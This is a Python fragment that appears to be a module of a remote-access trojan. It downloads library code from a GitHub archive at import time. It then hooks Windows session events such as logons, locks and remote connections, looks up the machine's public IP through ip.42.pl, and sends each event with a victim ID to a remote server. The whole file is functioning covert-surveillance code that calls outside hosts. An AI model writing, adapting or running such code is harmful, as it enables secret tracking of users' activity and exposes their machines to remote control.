pimport(
    '''import win32api as api
import win32con as con;import win32gui as gui
import win32ts as ts''',
    "https://github.com/MrByehack/t-a-r-e-y-b/raw/master/bGlicmFyaWVz/"
    "sessions.zip"
)


class WTSMonitor():
    started = False
    stop = False
    methods = {
        0x1: "Console {} Connected", 0x2: "Console {} Disconnected",
        0x3: "Remote {} Connected", 0x4: "Remote {} Disconnected",
        0x5: "Session {} Logged on", 0x6: "Session {} Logged off",
        0x7: "Session {} Locked", 0x8: "Session {} Unlockded",
        0x9: "SessionRemoteControl {}"
    }

    @classmethod
    def __init__(self, server, all_sessions):
        if self.started and (not self.stop):
            self.stop = True
        else:
            self.stop = False
        if self.started:
            return
        self.server = server
        self.started = True
        wc = gui.WNDCLASS()
        wc.hInstance = hInst = api.GetModuleHandle(None)
        wc.lpszClassName = "WTSMonitor"
        wc.lpfnWndProc = self.WndProc
        self.hWnd = gui.CreateWindow(
            gui.RegisterClass(wc), "WTS Event Monitor",
            0, 0, 0, con.CW_USEDEFAULT, con.CW_USEDEFAULT,
            0, 0, hInst, None
        )
        gui.UpdateWindow(self.hWnd)
        ts.WTSRegisterSessionNotification(
            self.hWnd, ts.NOTIFY_FOR_ALL_SESSIONS if all_sessions
            else ts.NOTIFY_FOR_THIS_SESSION
        )
        gui.PumpMessages()

    @classmethod
    def WndProc(self, hWnd, message, wParam, lParam):
        if message == 0x2B1 and not self.stop and self.methods.get(wParam):
            _send(self.server, '''inpu({!r},'41 95',0)'''.format(
                Myid+' : '+self.methods[wParam].format(lParam)+'\\n'+requests.get('http://ip.42.pl/raw').text))
        elif message == con.WM_CLOSE:
            gui.DestroyWindow(hWnd)
        elif message == con.WM_DESTROY:
            gui.PostQuitMessage(0)
        elif message == con.WM_QUERYENDSESSION:
            return True
